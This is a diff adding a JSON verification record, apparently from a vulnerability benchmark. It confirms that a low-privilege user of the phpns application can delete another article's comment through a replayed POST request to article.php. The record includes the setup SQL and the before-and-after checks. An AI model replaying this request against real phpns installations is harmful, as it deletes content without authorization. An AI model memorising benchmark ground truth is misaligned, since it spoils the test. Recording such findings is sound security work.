@@ -1,0 +1,43 @@
+{
+  "gt_id": "GT-011",
+  "app": "phpns",
+  "verified_at": "2026-09-06T04:57:45.649442+00:00",
+  "verdict": "vulnerable",
+  "summary": "register POST article.php?action=delete&do=comments&id=6 returned 200; instrumented comment id=24 of article 6 was deleted (exists_after=0).",
+  "sql_statements": [
+    {
+      "kind": "execute",
+      "sql": "INSERT INTO phpns_comments (article_id, comment_text, website, comment_author, timestamp, approved, ip) VALUES ('6', 'DRHLGT_delcomment_8670665146', '', 'drhlgt', '0', '1', '127.0.0.1')"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT id FROM phpns_comments WHERE comment_text='DRHLGT_delcomment_8670665146' ORDER BY id DESC LIMIT 1"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT COUNT(*) FROM phpns_comments WHERE id=24"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT COUNT(*) FROM phpns_comments WHERE id=24"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "table": "phpns_comments",
+      "inserted_row_id": "24",
+      "article_id": 6,
+      "token": "DRHLGT_delcomment_8670665146",
+      "exists_before": "1"
+    },
+    {
+      "kind": "replay",
+      "role": "register (low-privilege user)",
+      "request": "POST article.php?action=delete&do=comments&id=6 {24: 24}",
+      "status_code": 200,
+      "row_exists_after": "0",
+      "deleted": true
+    }
+  ]
+}
